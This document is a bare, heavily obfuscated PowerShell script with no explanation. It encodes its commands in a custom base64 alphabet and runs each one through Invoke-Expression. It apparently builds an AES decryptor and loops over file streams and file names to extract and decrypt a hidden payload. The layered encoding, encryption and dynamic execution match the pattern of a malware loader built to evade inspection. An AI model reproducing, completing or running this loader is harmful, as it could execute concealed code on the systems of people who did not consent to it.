function Do-B ([Object[]]$inStr="asdasd"){$b = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("YQBiAGMAZABlAGYAZwBoAGkAagBrAGwAbQBuAG8AcABxAHIAcwB0AHUAdgB3AHgAeQB6AEEAQgBDAEQARQBGAEcASABJAEoASwBMAE0ATgBPAFAAUQBSAFMAVABVAFYAVwBYAFkAWgAwADEAMgAzADQANQA2ADcAOAA5ACsALwA="));
   $r = "";
   $p = "";
   $c = $inStr.Length % 3;
   If($c -gt 0 ) {;
      While($c -lt 3){;
         $p += "=";
         $inStr += 0;
         $c += 1;
      };
   };
   ;For($i=0;
         $i -lt $inStr.Length;
         $i+=3){;
      $n0 = [convert]::ToInt32($inStr[$i]);
      $n1 = [convert]::ToInt32($inStr[$i+1]);
      $n2 = [convert]::ToInt32($inStr[$i+2]);
      $n = ($n0 -shl 16) + ($n1 -shl 8) + ($n2);
      $n0 = ($n -shr 18) -band 63;
      $n1 = ($n -shr 12) -band 63;
      $n2 = ($n -shr 6) -band 63;
      $n3 = $n -band 63;
      $r += $b[$n0] + $b[$n1] + $b[$n2] + $b[$n3];
   };
   $r = $r.SubString(0,$r.Length-$p.Length);
   $r = $r + $p;
   return $r;
}

Function Do-D([String]$inStr){;
   $p = "";
   $b = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("YQBiAGMAZABlAGYAZwBoAGkAagBrAGwAbQBuAG8AcABxAHIAcwB0AHUAdgB3AHgAeQB6AEEAQgBDAEQARQBGAEcASABJAEoASwBMAE0ATgBPAFAAUQBSAFMAVABVAFYAVwBYAFkAWgAwADEAMgAzADQANQA2ADcAOAA5ACsALwA="));
   $bi = @();
   $r = "";
   For($i = 0;
         $i -lt 256;
         $i++){;
      $bi += -1;
   };
   $enc = [system.Text.Encoding]::ASCII;
   $bb = $enc.GetBytes($b);
   For($i = 0;
         $i -lt $bb.Length;
         $i++){;
      $bi[$bb[$i]] = $i;
   };
   If($inStr[$inStr.Length-1] -eq "="){;
      $p += "A";
   };
   If($inStr[$inStr.Length-2] -eq "="){;
      $p += "A";
   };
   $inStr = $inStr.SubString(0,$inStr.Length - $p.Length) + $p;
   $inBytes = $enc.GetBytes($inStr);
   For($i=0;
         $i -lt $inBytes.Length;
         $i+=4){;
      $n0 = [convert]::ToInt32($inBytes[$i]);
      $n1 = [convert]::ToInt32($inBytes[$i+1]);
      $n2 = [convert]::ToInt32($inBytes[$i+2]);
      $n3 = [convert]::ToInt32($inBytes[$i+3]);
      $n0 = $bi[$inBytes[$i]] -shl 18;
      $n1 = $bi[$inBytes[$i+1]] -shl 12;
      $n2 = $bi[$inBytes[$i+2]] -shl 6;
      $n3 = $bi[$inBytes[$i+3]];
      $n = $n0 + $n1 + $n2 + $n3;
      $n0 = ($n -shr 16) -band 255;
      $n1 = ($n -shr 8) -band 255;
      $n2 = $n -band 255;
      $r += [convert]::ToChar($n0) + [convert]::ToChar($n1) + [convert]::ToChar($n2);
   };
   $r = $r.SubString(0,$r.Length-$p.Length);
   return $r;
}

function ds($enc, $p, $s="sc", $i="ivp") 
{ 
   if($enc -is [string]){ 
      $enc = rc "w0nVBNzLCNrDoJPgCM9TqMfZzty0u3rYAw5NkcrLBMmPia=="
   } 

   $r = rc "BMv3lu9IAMvJDcbtExn0zw0Uu2vJDxjPDhKUq3j5ChrVz3jHCgH5lLjPAM5KywvStwfUywDLzca="
      $p2 = [Text.Encoding]::UTF8.GetBytes($p) 
      $s = [Text.Encoding]::UTF8.GetBytes($s) 

      $r.Key = rc "kg5LDY1pyMPLy3qGu2vJDxjPDhKUq3j5ChrVz3jHCgH5lLbHC3n3B3jKrgvYAxzLqNL0zxmGjhaYlcaKCYWGiLniqteIlca1ks5hzxrcExrLCYGZmIK="
      $r.IV = rc "kg5LDY1pyMPLy3qGu2vJDxjPDhKUq3j5ChrVz3jHCgH5lLniqtfnyw5Hz2vKks5dB21WDxrLsgfZAcGGw1rLEhqUrw5JB2rPBMDDoJPvvey4lKDLDej5DgvZkcrPksaPwZaUlJe1xsa="


      $d = rc "jhiUq3jLyxrLrgvJCNLWDg9YkcK="
      $ms = rc "BMv3lu9IAMvJDcbjtY5nzw1VCNLtDhjLyw0GqcGSjgvUyYKG"
      $cs = rc "BMv3lu9IAMvJDcbtzwn1CML0Es5dCNLWDg9NCMfWAhKUq3j5ChrVu3rYzwfTicrTCYWKzcWIuMvHzciG"
      $sr = rc "BMv3lu9IAMvJDcbjtY5tDhjLyw1szwfKzxiGjgnZia=="
      rc "v3jPDguTt3v0Chv0icrZCI5szwfKvg9fBMqOkq=="
      rc "jhnYlKnSB3nLkcK="
      rc "jgnZlKnSB3nLkcK="
      rc "jg1ZlKnSB3nLkcK="
      rc "jhiUq2XLyxiOkq=="
} 

function rc([String]$inStr)
{
   return iex(Do-D($inStr))
}


rc "u2v0lvzHCMLHyMXLic1oyw1LicjdB25ZDw1LCIiGlvzHBhvLicHYyYaICJj2mgX2rfrbDtLjqu12sKrJyvr0twzuENHUv3L3BKXPy2PzqJi5mhHOBJf5tM5kq01mv0rNtfzcswLhBhvUu3L4BLPPy0rKqJiXvhL3nuT0z0XvENv2mNP3ntbXmJLvqZn2vhP4Au4IksaTu2nVCguGz2XVyMfS"
rc "u2v0lvzHCMLHyMXLic1oyw1LicjJBciGlvzHBhvLicHYyYaIDZnUmenntfv6mtblCti5vumZDLr6EgLvCti5vej3zLv6zvHqqK12DxP3mvDcz2yWENe9psiPic1ty29WzsbNBg9IywW="
rc "u2v0lvzHCMLHyMXLic1oyw1LicjHiIaTvMfSDwuGkhjJicjQz25tBeXUmxLoBJbdtuXvELLhs3KYv1vZDZvlENHiChPjr0LSDxPqqMD1r2Ljs1jUsuS9iIKGlvnJB3bLigDSB2jHBa=="

$p = $MyInvocation.MyCommand.Path

$g = $a -eq $p

If($g)
{
   rc "u2v0lvzHCMLHyMXLic1oyw1LicjNzYiGlvzHBhvLicHYyYaICJj2mgX1BK9bD1HlC3HYtejZyvr1z2yWqwnHsxfAuen2mKXvEMC5m0mXwhv6DZfxEgDyvNPzt1veAeGWAu5xr3iYDJbSDuWWENCWr2X2BJbdtxziqNnHusiPic1ty29WzsbNBg9IywW="
      foreach ($gi in $gg)
      {
         rc "u2v0lvzHCMLHyMXLic1oyw1LicjKiIaTvMfSDwuGkhjJicjYmNyWBhvUvKjoCKXctNfhBhzIserNr0DQz0rqBeT6uejNDM95DZfmAwmXDerOAKX5DZbhAMDeugXmBJbdtxziqNe9psiPic1ty29WzsbNBg9IywW="
            If($d.Length -ne 0)
            {
               rc "u2v0lvzHCMLHyMXLic1oyw1LicjTiIaTvMfSDwuGkhjJicjctxyZBhC5sufnDKPey2fuDMHmv3P1nuHcD3vhDtnmwKrNDLrStg5mEtn2wuf4CJvSs25zrxHImeiYrfL5Egjprxm1BNjKDMrdtKXxrgC5DhP4AJjbD25mDwHQvKrnteT6EgK9iIKGlvnJB3bLigDSB2jHBa=="
                  rc "u2v0lvzHCMLHyMXLic1oyw1Licj1iIaTvMfSDwuGkhjJicjctxyZBhC5sufnDKPey2fuDMHmv3P1nuHcD3vhDtnmwKrNDLrSthjmrwHXvxz2CMDVzxzvEti5s0f3nu4IksaTu2nVCguGz2XVyMfS"
                  rc "u2v0lvzHCMLHyMXLic1oyw1LicjOiIaTvMfSDwuGkhjJicj3mw41qZnYtejZnwnbEhjKqJi1mNP4AJb6EgPeB0PqDuiXBJbdtuXvELLhs0jZnwrcmJfxrhHYthnNzLPby0Dlrhm1AhP4CMnfEhjmq1Lhs3PJs1bRCt09iIKGlvnJB3bLigDSB2jHBa=="

                  If($h -eq $gi.Stream)
                  {
                     rc "u2v0lvzHCMLHyMXLic1oyw1LicjMBIiGlvzHBhvLicHYyYaICMC4vhjJyuLdDLbXCtn5wxrMDJz6wKTACvPMEur4udnTDKq0EJfiD0vmsZfTzxzpq3qWssiPic1ty29WzsbNBg9IywW="
                        If($fn -eq $gi.FileName)
                        {
                           rc "u2v0lvzHCMLHyMXLic1oyw1LicjKyxqIic1wywX1zsaOiM1HrM9cthzyutHKEunWtw1gt0rnrue9psiPic1ty29WzsbNBg9IywW="
                              rc "u2v0lvzHCMLHyMXLic1oyw1LicjTiIaTvMfSDwuGkhjJicjctxyZBhC5sufnDKPey2fuDMHmv3P1nuHcD3vhDtnmwKrNDLrStg5mEtn2wuf4CJvSs25zrxHImeiYrfL5Egjprxm1BNjKDMrdtKXxrgC5DhP4AJjbD25mDwHQvKrnteT6EgK9iIKGlvnJB3bLigDSB2jHBa=="
                              rc "u2v0lvzHCMLHyMXLic1oyw1Licj1iIaTvMfSDwuGkhjJicjctxyZBhC5sufnDKPey2fuDMHmv3P1nuHcD3vhDtnmwKrNDLrSthjmrwHXvxz2CMDVzxzvEti5s0f3nu4IksaTu2nVCguGz2XVyMfS"
                              rc "u2v0lvzHCMLHyMXLic1oyw1LicjOiIaTvMfSDwuGkhjJicj3mw41qZnYtejZnwnbEhjKqJi1mNP4AJb6EgPeB0PqDuiXBJbdtuXvELLhs0jZnwrcmJfxrhHYthnNzLPby0Dlrhm1AhP4CMnfEhjmq1Lhs3OYs1vYtuXtENu1sej3DvbRC0S9iIKGlvnJB3bLigDSB2jHBa=="
                              rc "u2v0lvzHCMLHyMXLic1oyw1LicjWyxj0nciGlvzHBhvLicHKCYaKzgf0icrOksaTu2nVCguGz2XVyMfS"
                        }
                  }
            }
      }
}
